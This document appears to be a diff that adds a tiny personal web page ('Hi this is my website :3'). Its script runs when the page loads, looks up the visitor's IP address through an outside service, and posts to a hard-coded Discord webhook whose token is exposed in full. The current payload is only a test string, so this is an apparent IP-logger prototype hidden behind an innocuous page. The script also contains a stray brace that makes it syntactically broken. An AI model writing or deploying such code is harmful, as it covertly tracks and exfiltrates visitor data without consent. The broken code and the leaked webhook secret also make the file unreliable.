@@ -1,0 +1,27 @@
+<html>
+<head>
+<title>Hi</title>
+</head>
+<body>
+<p>Hi this is my website :3</p>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+<script>
+$.getJSON("https://api.myip.com", function(data) {
+  let dataaa = {'content':'test'}
+  $.ajax({ 
+    type:"POST",
+    url:"https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP",
+    data: JSON.stringify(dataaa), 
+    contentType: 'application/json',
+    success: function(res) {
+      console.log(res);
+    },
+    error: function(xhr, status, err) {
+      console.error(xhr, status, err.toString());
+    }
+  });  
+}
+});
+</script>
+</body>
+</html>
